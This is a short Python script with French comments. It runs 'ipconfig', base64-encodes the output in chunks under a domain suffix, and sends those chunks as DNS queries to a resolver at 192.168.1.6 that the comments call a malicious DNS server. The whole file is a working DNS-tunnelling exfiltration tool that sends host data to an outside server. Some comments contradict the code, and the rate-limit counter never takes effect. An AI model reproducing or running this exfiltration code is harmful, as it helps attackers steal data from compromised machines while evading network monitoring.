from dns import resolver
import subprocess
import base64
import time
from Crypto.Cipher import AES

# division des données retournées par subprocess
# en bloc de 32 octets, rassemblés dans un tableau
def chunk(data):
    chunk_size = 44
    chunks = []

    # Iterate over the data in chunk_size intervals
    for i in range(0, len(data), chunk_size):
        # Get the current chunk
        chunk = data[i:i+chunk_size]

        # Encode the chunk using base64
        encoded_chunk = base64.b64encode(chunk.encode()).decode()

        # Append ".tkt.fr" to the end of the encoded chunk
        encoded_chunk += ".python.com"

        # Add the encoded chunk to the chunks array
        chunks.append(encoded_chunk)

    return chunks

# Example usage with subprocess
command = "ipconfig"
process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
output_binary, err = process.communicate()

# Convert the output to string
output_string = output_binary.decode()

data = chunk(output_string)
print(data)

# Adresse et port du serveur DNS malicieux
# 192.168.1.6:53
HOST = '192.168.1.6'
PORT = 53

# Créer une instance de resolver
res = resolver.Resolver()

# Spécifier le serveur DNS
res.nameservers = [HOST]
res.port = PORT

counter = 0
for requests in data:
    answer = res.resolve(requests.strip(), 'A')
    counter = 0
    if counter >= 63:
        time.sleep(2)
        counter = 0
    for ipval in answer:
        print('IP', ipval.to_text())